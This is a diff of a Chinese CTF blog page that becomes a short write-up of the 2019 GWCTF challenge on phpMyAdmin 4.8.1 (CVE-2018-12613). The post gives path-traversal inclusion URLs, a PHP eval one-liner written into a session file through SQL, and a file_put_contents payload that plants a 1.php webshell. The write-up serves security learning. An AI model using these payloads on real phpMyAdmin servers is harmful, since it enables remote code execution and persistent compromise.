@@ -55,15 +55,21 @@
   };
 </script>
 
-  <meta name="description" content="念念不忘，必有回响">
-<meta property="og:type" content="website">
-<meta property="og:title" content="LiM&#39;s blog">
-<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;tags&#x2F;web&#x2F;index.html">
+  <meta name="description" content="2.我有一个数据库CVE-2018-12613的复现，影响版本:4.8.0—4.8.1。访问phpmyadmin直接进来phpmyadmin界面，发现版本为4.8.1测试一下存在CVE-2018-12613包含漏洞。">
+<meta name="keywords" content="CTF,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 GWCTF部分题解">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;09&#x2F;2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;index.html">
 <meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="念念不忘，必有回响">
+<meta property="og:description" content="2.我有一个数据库CVE-2018-12613的复现，影响版本:4.8.0—4.8.1。访问phpmyadmin直接进来phpmyadmin界面，发现版本为4.8.1测试一下存在CVE-2018-12613包含漏洞。">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;09&#x2F;2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1575877114348.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;09&#x2F;2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1575877560989.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;09&#x2F;2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1575878167633.png">
+<meta property="og:updated_time" content="2019-12-09T10:03:19.903Z">
 <meta name="twitter:card" content="summary">
-  <link rel="canonical" href="https://li1m.github.io/tags/web/">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;09&#x2F;2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1575877114348.png">
+  <link rel="canonical" href="https://li1m.github.io/2019/12/09/2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
 
 
 <script id="page-configurations">
@@ -71,13 +77,13 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>Tag: web | LiM's blog</title>
+  <title>2019 GWCTF部分题解 | LiM's blog</title>
   
 
 
@@ -252,256 +258,162 @@
         <div class="content-wrap">
             
 
-  
-    
-    
-  
-    
-    
-  
-    
-    
-  
-    
-    
-  
-    
-    
-  
-  
-
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h1 class="collection-header">web
-          <small>Tag</small>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/12/09/2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiM">
+      <meta itemprop="description" content="念念不忘，必有回响">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiM's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            2019 GWCTF部分题解
+            
+
+          
         </h1>
-      </div>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-12-09 15:24:03 / Modified: 18:03:19" itemprop="dateCreated datePublished" datetime="2019-12-09T15:24:03+08:00">2019-12-09</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              
+              <span>1k</span>
+            </span>
+          
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              
+              <span>1 mins.</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
+        <p>2.我有一个数据库</p><p>CVE-2018-12613的复现，影响版本:4.8.0—4.8.1。访问phpmyadmin直接进来phpmyadmin界面，发现版本为4.8.1测试一下存在CVE-2018-12613包含漏洞。</p><a id="more"></a>
 
-  
-  
+<p><img src="1575877114348.png" alt="1575877114348"></p>
+<p>盲猜flag在根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://083f32c3-c02b-4539-b8ee-1143cd206bb0.node3.buuoj.cn/phpmyadmin?target=db_sql.php%253f/../../../../../../../../flag	//得到flag</span><br></pre></td></tr></table></figure>
 
-  
+<p>这样就没意思啦，想办法getshell，用它这个漏洞包含日志getshell，但是前提我们要知道日志的路径，它在robots.txt给了一个phpinfo页面，查看一下session.save_path的值可以得到路径。(一般默认就是这个 /var/lib/php/sessions )</p>
+<p><img src="1575877560989.png" alt="1575877560989"></p>
+<p>在phpmyadmin中执行sql语句，如select ‘&lt;?php @eval($_GET[“a”]);?&gt;’，然后这句话会写到日志，将日志包含就可以(ps:测试环境好像不能post传参)</p>
+<p><img src="1575878167633.png" alt="1575878167633"></p>
+<p>然后找到session的值，命名时会在session的值前面+sess_，所以最终payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://083f32c3-c02b-4539-b8ee-1143cd206bb0.node3.buuoj.cn/phpmyadmin?target=db_sql.php%253f/../../../../../../../..//var/lib/php/sessions/sess_oolmt4nq15g2hlg01034uqousu&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>但是这个日志太多看得难受，试了一下能不能写文件上去，发现是可以的，在1.php写进了一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://083f32c3-c02b-4539-b8ee-1143cd206bb0.node3.buuoj.cn/phpmyadmin?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_oolmt4nq15g2hlg01034uqousu&amp;a=file_put_contents(&apos;1.php&apos;,&apos;&lt;?php @eval($_POST[a]);?&gt;&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>现在感觉就好多了，最后找到flag。</p>
+
+    </div>
+
     
-    <div class="collection-year">
-      <h1 class="collection-header">2019</h1>
-    </div>
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-12-10T13:39:36+08:00"
-              content="2019-12-10">
-          12-10
-        </time>
-      </div>
-
-      <h2 class="post-title">
+    
+    
         
-          <a class="post-title-link" href="/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/" itemprop="url">
-            <span itemprop="name">2019 Stalker招新web&crypto题解</span>
-          </a>
-        
-      </h2>
+      
 
-    </header>
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
+            
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/05/2019-%E5%AE%89%E6%B4%B5%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="next" title="2019 安洵杯部分题解">
+                  <i class="fa fa-chevron-left"></i> 2019 安洵杯部分题解
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/" rel="prev" title="2019 Stalker招新web&crypto题解">
+                  2019 Stalker招新web&crypto题解 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
   </article>
-
-
-
+  
   
   
 
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-12-09T15:24:03+08:00"
-              content="2019-12-09">
-          12-09
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/12/09/2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" itemprop="url">
-            <span itemprop="name">2019 GWCTF部分题解</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-  
-  
-
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-12-05T22:40:08+08:00"
-              content="2019-12-05">
-          12-05
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/12/05/2019-%E5%AE%89%E6%B4%B5%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" itemprop="url">
-            <span itemprop="name">2019 安洵杯部分题解</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-  
-  
-
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-11-25T19:36:22+08:00"
-              content="2019-11-25">
-          11-25
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/11/25/EIS-2019-web-writeup/" itemprop="url">
-            <span itemprop="name">EIS 2019 web writeup</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-  
-  
-
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-11-24T17:12:47+08:00"
-              content="2019-11-24">
-          11-24
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/" itemprop="url">
-            <span itemprop="name">NJUPT CTF 2019 web部分writeup</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-  
-  
-
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-11-19T12:09:44+08:00"
-              content="2019-11-19">
-          11-19
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" itemprop="url">
-            <span itemprop="name">upload-libs通关笔记</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-  
-  
-
-  
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-10-28T22:06:10+08:00"
-              content="2019-10-28">
-          10-28
-        </time>
-      </div>
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2019/10/28/Roarctf-Web-writeup/" itemprop="url">
-            <span itemprop="name">Roarctf Web writeup</span>
-          </a>
-        
-      </h2>
-
-    </header>
-  </article>
-
-
-
-    </div>
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
@@ -518,6 +430,11 @@
 
   <aside class="sidebar">
     <div class="sidebar-inner">
+        
+        
+        
+        
+      
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
